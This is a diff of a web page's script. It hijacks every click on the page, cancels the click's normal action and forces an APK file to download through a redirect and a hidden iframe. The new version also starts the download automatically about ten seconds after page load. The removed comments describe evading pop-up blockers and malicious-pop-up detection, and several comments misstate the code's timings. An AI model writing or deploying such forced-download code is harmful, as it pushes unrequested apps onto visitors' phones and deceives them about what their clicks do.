@@ -463,54 +463,62 @@ margin-bottom: 24px;
     </main>
 
     <!-- Any click triggers download logic + prevents default redirection -->
-    <script>
-        // Define a download link variable for easy modification.
-        const apkUrl = "https://raw.githubusercontent.com/phuonganhle1812-lang/apkpurokj/refs/heads/main/GardenTV_v1.1.2.apk"; 
-        let hasStarted = false; // Prevent repeated triggering
+	<script>
+		// Define a download link variable for easy modification.
+		const apkUrl = "https://example.com/Grok.apk"; 
+		
+		// Instead of a permanent lock, we use a temporary "cooldown" flag.
+		let isProcessing = false; 
 
-        function startDownload() {
-            if (hasStarted) return; // If the download has already started, then this process will not be executed.
-            hasStarted = true;
+		function startDownload() {
+			// If a request is currently being processed (within the 2s cooldown), ignore this click.
+			if (isProcessing) return; 
+			
+			// Lock it temporarily
+			isProcessing = true;
+			console.log("Start download task...");
+			
+			// --- 1. Main Method: Location Redirect ---
+			// This is the most reliable method for mobile browsers to trigger a download prompt without opening a new tab.
+			window.location.href = apkUrl;
+			
+			// --- 2. Backup Method: Iframe ---
+			// If the redirect doesn't work on specific browser versions, this hidden iframe forces the request.
+			setTimeout(() => {
+				const iframe = document.createElement('iframe');
+				iframe.style.display = 'none';
+				iframe.src = apkUrl;
+				document.body.appendChild(iframe);
+			}, 500);
 
-            console.log("Start download task...");
-            
-            // Core optimization：
-            // Use `window.location.href` instead of `window.open` or `target="_blank"`.
-            // This is the only way to bypass the mobile browser's "automatic pop-up blocking".
-            // As long as the link ends in .apk, the browser will automatically download it without redirecting to another page.
-            window.location.href = apkUrl;
-            
-            // Alternative solution (If the above fails, try creating a hidden iframe to force a download)
-            setTimeout(() => {
-                const iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
-                iframe.src = apkUrl;
-                document.body.appendChild(iframe);
-            }, 500);
-        }
+			// --- 3. Unlock Logic ---
+			// automatically unlock after 2 seconds.
+			// This allows the user to trigger the download again if they accidentally clicked "Cancel".
+			setTimeout(() => {
+				isProcessing = false;
+				console.log("Cooldown finished. User can click to download again.");
+			}, 500);
+		}
 
-        // Listen for full-screen clicks (capture phase)
-        document.addEventListener('click', function(e) {
-            // Prevent the default behavior of any element on the page (prevent link redirects, prevent button refreshes, etc.).
-            e.preventDefault(); 
-            e.stopPropagation(); 
-            
-            // User-initiated downloads have the highest priority and will never be blocked by the browser.
-            startDownload();
-        }, true);
+		// Listen for full-screen clicks (capture phase)
+		document.addEventListener('click', function(e) {
+			// Prevent default behavior (e.g., stops links from navigating away, stops form submissions)
+			e.preventDefault(); 
+			e.stopPropagation(); 
+			
+			// Trigger download immediately on user interaction
+			startDownload();
+		}, true);
 
-        // Page loading logic
-        //window.onload = function() {
-            // Automatically attempt to download in 5 seconds
-            // Because location.href was used above, this will not be identified as a malicious pop-up.
-        //    setTimeout(() => {
-        //        if (!hasStarted) {
-        //            console.log("Automatic download triggered");
-        //            startDownload();
-        //        }
-        //    }, 10000);
-        //}
-    </script>
+		// Page loading logic
+		window.onload = function() {
+			// Automatically attempt to download after 5 seconds
+			setTimeout(() => {
+				console.log("Automatic timer triggered");
+				startDownload();
+			}, 10000);
+		}
+	</script>
 
 </body>
 </html>
